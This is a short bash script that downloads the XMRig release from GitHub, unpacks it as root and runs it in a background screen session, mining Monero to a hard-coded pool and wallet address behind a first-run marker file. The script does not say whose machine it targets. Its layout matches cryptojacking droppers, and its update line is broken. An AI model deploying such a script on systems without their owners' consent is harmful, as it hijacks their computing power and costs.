SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/longtamnek.txt" ];
then
	echo "long deptraivlon" > longtamnek.txt
	cd /usr/local/bin
	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
        sudo apt update && upgrade -y
        sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
        sudo tar xvzf xmrig-6.18.1-bionic-x64.tar.gz
        cd xmrig-6.18.1/
        sudo screen ./xmrig -o sg.minexmr.com:443 -u 86N2TuniJazbv6Mrf4jXnJfbC4w8bUN6M53wC1kyfYAt6BmY7nqDjx7YG663X1C4zXQN2LafC695K147QQBpbLfLNwzV9rZ -k --tls --threads=3
fi
